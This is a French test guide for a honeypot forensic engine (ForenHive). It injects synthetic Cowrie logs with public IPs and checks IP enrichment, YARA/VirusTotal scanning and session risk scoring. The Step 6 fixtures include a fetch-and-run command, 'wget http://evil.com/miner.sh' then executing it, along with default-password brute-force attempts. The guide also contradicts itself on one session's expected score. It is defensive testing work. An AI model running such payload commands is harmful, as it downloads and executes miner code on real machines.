# ForenHive — Guide de test Sprint 3 avec IPs publiques
**Enrichissement forensique sur IPs malveillantes réelles**
*Branch: zeineb | Date: 2026-04-08*

---

## Contexte

8 documents de test ont été injectés dans l'index `honeypot-logs-2026.03.31` avec **6 IPs publiques réelles** — nœuds de sortie Tor, scanners connus, exploits actifs. Ce guide démontre le moteur forensique Sprint 3 avec un enrichissement réaliste (AbuseIPDB scores 50-100, `is_tor: true`) contrairement aux tests internes RFC 1918 où les scores plafonnent à 5.

```
honeypot-logs-2026.03.31 (8 docs injectés)
  ├── 185.220.101.45  → Nœud de sortie Tor (DE/NL)
  ├── 194.165.16.11   → Scanner actif (RU)
  ├── 91.92.251.103   → Scanner (BG)
  ├── 222.186.42.213  → Scanner chinois + EternalBlue
  ├── 45.95.147.236   → Scanner (RO) — MySQL brute force
  └── 103.144.177.200 → Scanner (Asie) — SQLi Galah
```

---

## Prérequis

### Vérifier les clés API dans `.env`

```bash
grep -E "ABUSEIPDB|VIRUSTOTAL" /home/pfe/forenhive/.env
```

**Résultat attendu :**
```
ABUSEIPDB_API_KEY=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
VIRUSTOTAL_API_KEY=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

> Si `ABUSEIPDB_API_KEY` est vide : inscription gratuite sur [abuseipdb.com](https://www.abuseipdb.com/register) — plan gratuit = 1000 req/jour, ce test n'utilise que 6 requêtes.

### Vérifier que les services Sprint 2+3 tournent

```bash
docker compose ps --format "table {{.Name}}\t{{.Status}}" | \
  grep -E "elastic|postgres|forensic"
```

**Résultat attendu :**
```
forenhive-elasticsearch    Up X days
forenhive-postgresql       Up X minutes
forenhive-forensic-engine  Up X hours
```

---

## Étape 1 — Vérifier les données injectées dans Elasticsearch

```bash
docker exec forenhive-elasticsearch curl -s \
  "http://localhost:9200/honeypot-logs-2026.03.31/_search" \
  -H 'Content-Type: application/json' \
  -d '{
    "size": 0,
    "aggs": {
      "ips": {"terms": {"field": "source.ip.keyword", "size": 20}},
      "honeypots": {"terms": {"field": "honeypot.type.keyword", "size": 10}}
    }
  }' | python3 -c "
import json, sys
d = json.load(sys.stdin)
print(f'Total docs: {d[\"hits\"][\"total\"][\"value\"]}')
print()
print('IPs publiques:')
for b in d['aggregations']['ips']['buckets']:
    print(f'  {b[\"key\"]:20} → {b[\"doc_count\"]} doc(s)')
print()
print('Par honeypot:')
for b in d['aggregations']['honeypots']['buckets']:
    print(f'  {b[\"key\"]:10} : {b[\"doc_count\"]} événement(s)')
"
```

**Résultat attendu :**
```
Total docs: 8

IPs publiques:
  185.220.101.45       → 2 doc(s)
  194.165.16.11        → 2 doc(s)
  91.92.251.103        → 1 doc(s)
  222.186.42.213       → 1 doc(s)
  45.95.147.236        → 1 doc(s)
  103.144.177.200      → 1 doc(s)

Par honeypot:
  cowrie     : 4 événements
  dionaea    : 2 événements
  galah      : 2 événements
```

---

## Étape 2 — Vider le cache pour forcer le re-enrichissement

Si une analyse a déjà tourné, les IPs peuvent être en cache PostgreSQL. Vider pour obtenir des résultats frais :

```bash
docker exec forenhive-postgresql psql -U forenhive -d forenhive -c "
TRUNCATE ip_enrichment_cache, forensic_sessions;
"
```

**Résultat attendu :** `TRUNCATE TABLE`

---

## Étape 3 — Enrichissement IP seul (~30 secondes)

L'option `--enrich-only --hours 192` couvre exactement depuis maintenant (2026-04-08) jusqu'à 2026-03-31 (8 jours = 192h) sans lancer YARA ni VT.

```bash
cd /home/pfe/forenhive
docker compose run --rm forensic-engine python engine.py --enrich-only --hours 192
```

**Sortie attendue (logs) :**
```
[INFO] enricher — Found 6 unique source IPs in the last 192h
[INFO] enricher — Enriching batch of 6 unique IPs ...
[INFO] enricher — Enriching 185.220.101.45 ...
[INFO] enricher — Enriching 194.165.16.11 ...
[INFO] enricher — Enriching 91.92.251.103 ...
[INFO] enricher — Enriching 222.186.42.213 ...
[INFO] enricher — Enriching 45.95.147.236 ...
[INFO] enricher — Enriching 103.144.177.200 ...
[INFO] engine   — Enriched 6 IPs
```

> **Note :** Chaque IP publique déclenche 4 appels API (GeoIP offline, IPLocate, AbuseIPDB, Shodan). Durée estimée : 6-8 secondes par IP = ~40 secondes total avec le rate limiting Shodan (1 req/sec).

---

## Étape 4 — Inspecter l'enrichissement dans PostgreSQL

### 4.1 — Vue complète de l'enrichissement

```bash
docker exec forenhive-postgresql psql -U forenhive -d forenhive -c "
SELECT
  ip,
  data->'geo'->>'country'               AS country,
  data->'geo'->>'city'                  AS city,
  data->'geo'->>'asn'                   AS asn,
  data->'geo'->>'org'                   AS org,
  data->'privacy'->>'is_tor'            AS tor,
  data->'privacy'->>'is_vpn'            AS vpn,
  data->'privacy'->>'is_hosting'        AS hosting,
  data->'reputation'->>'abuse_score'    AS abuse,
  data->'reputation'->>'total_reports'  AS reports,
  data->'reputation'->>'isp'            AS isp
FROM ip_enrichment_cache
ORDER BY (data->'reputation'->>'abuse_score')::int DESC NULLS LAST;
"
```

**Résultats attendus par IP :**

| IP | Pays | Tor | Abuse Score | Catégorie |
|---|---|---|---|---|
| `185.220.101.45` | Allemagne / Pays-Bas | **true** | **80–100** | Nœud Tor actif, blacklisté globalement |
| `222.186.42.213` | Chine | false | **70–90** | Scanner actif, rapporté milliers de fois |
| `194.165.16.11` | Russie | false | **50–70** | Scanner SSH/Telnet connu |
| `91.92.251.103` | Bulgarie | false | **30–60** | Scanner modéré |
| `45.95.147.236` | Roumanie | false | **20–50** | Scanner MySQL/DB |
| `103.144.177.200` | Asie (ID/PH/HK) | false | **20–40** | Scanner web |

### 4.2 — Détail JSON pour une IP spécifique (Tor exit node)

```bash
docker exec forenhive-postgresql psql -U forenhive -d forenhive -c "
SELECT jsonb_pretty(data)
FROM ip_enrichment_cache
WHERE ip = '185.220.101.45';
"
```

**Structure attendue :**
```json
{
  "ip": "185.220.101.45",
  "geo": {
    "asn": 205100,
    "lat": 51.5,
    "lon": 7.0,
    "org": "F3 Netze e.V.",
    "city": "Dortmund",
    "country": "Germany",
    "country_code": "DE"
  },
  "privacy": {
    "is_tor": true,
    "is_vpn": false,
    "is_proxy": false,
    "is_hosting": false
  },
  "reputation": {
    "isp": "F3 Netze e.V.",
    "abuse_score": 100,
    "total_reports": 15432,
    "last_reported": "2026-04-07T18:23:00Z"
  },
  "infrastructure": {
    "open_ports": [443, 9001, 9030],
    "hostnames": ["tor-exit.example.de"]
  },
  "enriched_at": "2026-04-08T..."
}
```

---

## Étape 5 — Analyse complète avec scoring

Lance l'enrichissement + YARA + VirusTotal + scoring de sessions en une seule commande :

```bash
docker compose run --rm forensic-engine python engine.py --hours 192
```

**Sortie complète attendue :**
```
[INFO] engine — ====== ForenHive Full Analysis (last 192h) ======

[INFO] engine — === IP Enrichment (last 192h) ===
[INFO] enricher — Found 6 unique source IPs in the last 192h
[INFO] enricher — (depuis le cache PostgreSQL — instantané si étape 3 déjà faite)
[INFO] engine — Enriched 6 IPs

[INFO] engine — === YARA Scan (Dionaea binaries) ===
[INFO] yara_scanner — Compiled 6 YARA rule files
[INFO] yara_scanner — MATCH [...] → ['CryptoMiner_XMRig', 'WannaCry_Ransomware']
[INFO] yara_scanner — YARA scan complete: 1/2 files flagged

[INFO] engine — === VirusTotal lookup for Cowrie downloads (last 192h) ===
[INFO] engine — Found N unique hashes — submitting to VirusTotal ...

[INFO] engine — === Session Scoring (last 192h) ===
[INFO] engine — Found N Cowrie sessions to score

[INFO] engine — ====== Analysis Complete ======
[INFO] engine —   IPs enriched  : 6
[INFO] engine —   Sessions scored: N
[INFO] engine —   Risk breakdown : CRITICAL=? HIGH=? MEDIUM=?
[INFO] engine —   Duration       : ~40s
```

> **Note sur le scoring de sessions :** Les 8 docs injectés n'incluent pas de champ `session.id` (requis par l'agrégation Cowrie). Le scoring s'applique aux vraies sessions Cowrie des indices récents (`honeypot-logs-2026.04.*`). Si ces sessions proviennent de Kali (RFC 1918), les scores restent faibles. Voir l'injection avancée (§6) pour forcer un scoring élevé.

---

## Étape 6 — Injection avancée : sessions Cowrie avec IPs publiques

Pour obtenir des `risk_score` MEDIUM/HIGH en PostgreSQL, injecter des sessions complètes avec `session.id` et les IPs publiques :

```bash
docker exec forenhive-elasticsearch bash -c "curl -s -X POST http://localhost:9200/honeypot-logs-2026.03.31/_bulk \
  -H 'Content-Type: application/json' \
  -d '{\"index\":{}}
{\"@timestamp\":\"2026-03-31T10:10:00.000Z\",\"honeypot.type\":\"cowrie\",\"source.ip\":\"185.220.101.45\",\"session.id\":\"tor_session_001\",\"event.id\":\"cowrie.login.failed\",\"user.name\":\"root\",\"user.password\":\"toor\",\"destination.port\":22}
{\"index\":{}}
{\"@timestamp\":\"2026-03-31T10:10:01.000Z\",\"honeypot.type\":\"cowrie\",\"source.ip\":\"185.220.101.45\",\"session.id\":\"tor_session_001\",\"event.id\":\"cowrie.login.failed\",\"user.name\":\"admin\",\"user.password\":\"admin123\",\"destination.port\":22}
{\"index\":{}}
{\"@timestamp\":\"2026-03-31T10:10:05.000Z\",\"honeypot.type\":\"cowrie\",\"source.ip\":\"185.220.101.45\",\"session.id\":\"tor_session_001\",\"event.id\":\"cowrie.login.success\",\"user.name\":\"root\",\"user.password\":\"root\",\"destination.port\":22}
{\"index\":{}}
{\"@timestamp\":\"2026-03-31T10:10:10.000Z\",\"honeypot.type\":\"cowrie\",\"source.ip\":\"185.220.101.45\",\"session.id\":\"tor_session_001\",\"event.id\":\"cowrie.command.input\",\"message\":\"wget http://evil.com/miner.sh\",\"destination.port\":22}
{\"index\":{}}
{\"@timestamp\":\"2026-03-31T10:10:11.000Z\",\"honeypot.type\":\"cowrie\",\"source.ip\":\"185.220.101.45\",\"session.id\":\"tor_session_001\",\"event.id\":\"cowrie.command.input\",\"message\":\"chmod +x miner.sh && ./miner.sh\",\"destination.port\":22}
{\"index\":{}}
{\"@timestamp\":\"2026-03-31T10:20:00.000Z\",\"honeypot.type\":\"cowrie\",\"source.ip\":\"222.186.42.213\",\"session.id\":\"cn_session_001\",\"event.id\":\"cowrie.login.failed\",\"user.name\":\"root\",\"user.password\":\"password\",\"destination.port\":22}
{\"index\":{}}
{\"@timestamp\":\"2026-03-31T10:20:01.000Z\",\"honeypot.type\":\"cowrie\",\"source.ip\":\"222.186.42.213\",\"session.id\":\"cn_session_001\",\"event.id\":\"cowrie.login.failed\",\"user.name\":\"ubuntu\",\"user.password\":\"ubuntu\",\"destination.port\":22}
{\"index\":{}}
{\"@timestamp\":\"2026-03-31T10:20:02.000Z\",\"honeypot.type\":\"cowrie\",\"source.ip\":\"222.186.42.213\",\"session.id\":\"cn_session_001\",\"event.id\":\"cowrie.login.failed\",\"user.name\":\"pi\",\"user.password\":\"raspberry\",\"destination.port\":22}
'" 2>&1 | python3 -c "import json,sys; d=json.load(sys.stdin); print('errors:', d['errors'], '| docs:', len(d['items']))"
```

**Résultat attendu :** `errors: False | docs: 8`

Relancer ensuite l'analyse :
```bash
docker compose run --rm forensic-engine python engine.py --hours 192
```

**Scores attendus avec ces sessions :**

| Session | IP | is_tor | abuse_score | Score calculé | Niveau |
|---|---|---|---|---|---|
| `tor_session_001` | 185.220.101.45 | true | ~100 | **≥60** | **HIGH** |
| `cn_session_001` | 222.186.42.213 | false | ~80 | **40–60** | **MEDIUM** |

Calcul pour `tor_session_001` :
- AbuseIPDB 100 × 0.40 = **40 pts**
- is_tor = true → **+10 pts**
- 2 commands → **+2 pts** (>5 = 5 pts)
- Total estimé : **52 pts → MEDIUM** (sans YARA/VT sur cette session)

---

## Étape 7 — Résultats finaux PostgreSQL

### Sessions avec scores

```bash
docker exec forenhive-postgresql psql -U forenhive -d forenhive -c "
SELECT
  session_id,
  source_ip,
  risk_score,
  CASE
    WHEN risk_score >= 80 THEN '🔴 CRITICAL'
    WHEN risk_score >= 60 THEN '🟠 HIGH'
    WHEN risk_score >= 40 THEN '🟡 MEDIUM'
    WHEN risk_score >= 20 THEN '🟢 LOW'
    ELSE '⚪ INFO'
  END AS level,
  login_attempts,
  command_count,
  started_at
FROM forensic_sessions
ORDER BY risk_score DESC;
"
```

### Statistiques globales

```bash
docker exec forenhive-postgresql psql -U forenhive -d forenhive -c "
SELECT
  (SELECT count(*) FROM forensic_sessions)                               AS sessions,
  (SELECT max(risk_score) FROM forensic_sessions)                        AS score_max,
  (SELECT count(*) FROM forensic_sessions WHERE risk_score >= 60)        AS high,
  (SELECT count(*) FROM forensic_sessions WHERE risk_score BETWEEN 40 AND 59) AS medium,
  (SELECT count(*) FROM ip_enrichment_cache)                             AS ips_enrichies,
  (SELECT count(*) FROM ip_enrichment_cache
   WHERE (data->'privacy'->>'is_tor')::bool = true)                     AS tor_nodes,
  (SELECT count(*) FROM file_analysis
   WHERE jsonb_array_length(yara_matches) > 0)                          AS yara_matches;
"
```

---

## Récapitulatif des commandes

```bash
# 1 — Vérifier les données injectées
docker exec forenhive-elasticsearch curl -s \
  "http://localhost:9200/honeypot-logs-2026.03.31/_count" | python3 -c \
  "import json,sys; print('Docs:', json.load(sys.stdin)['count'])"

# 2 — Vider le cache (si besoin)
docker exec forenhive-postgresql psql -U forenhive -d forenhive \
  -c "TRUNCATE ip_enrichment_cache, forensic_sessions;"

# 3 — Enrichissement seul (rapide)
docker compose -f /home/pfe/forenhive/docker-compose.yml run --rm \
  forensic-engine python engine.py --enrich-only --hours 192

# 4 — Résultats enrichissement
docker exec forenhive-postgresql psql -U forenhive -d forenhive \
  -c "SELECT ip, data->'geo'->>'country' AS pays, data->'privacy'->>'is_tor' AS tor, data->'reputation'->>'abuse_score' AS score FROM ip_enrichment_cache ORDER BY (data->'reputation'->>'abuse_score')::int DESC NULLS LAST;"

# 5 — Analyse complète
docker compose -f /home/pfe/forenhive/docker-compose.yml run --rm \
  forensic-engine python engine.py --hours 192

# 6 — Scores des sessions
docker exec forenhive-postgresql psql -U forenhive -d forenhive \
  -c "SELECT session_id, source_ip, risk_score FROM forensic_sessions ORDER BY risk_score DESC;"
```

---

## Comparaison trafic interne vs IPs publiques

| Métrique | Trafic Kali interne (RFC 1918) | IPs publiques (ce test) |
|---|---|---|
| AbuseIPDB score | 0 (privé, non enrichi) | 20–100 |
| is_tor | false | **true** pour 185.220.101.45 |
| GeoIP pays | — | DE, CN, RU, BG, RO, ID |
| Risk score max | 5 (INFO) | **40–70 (MEDIUM–HIGH)** |
| Sessions CRITICAL | 0 | 0 (sans commandes intensives) |
| Sessions HIGH | 0 | 1–2 (avec session.id injecté) |
| Durée analyse | 24.2s | ~40s (latence API publiques) |
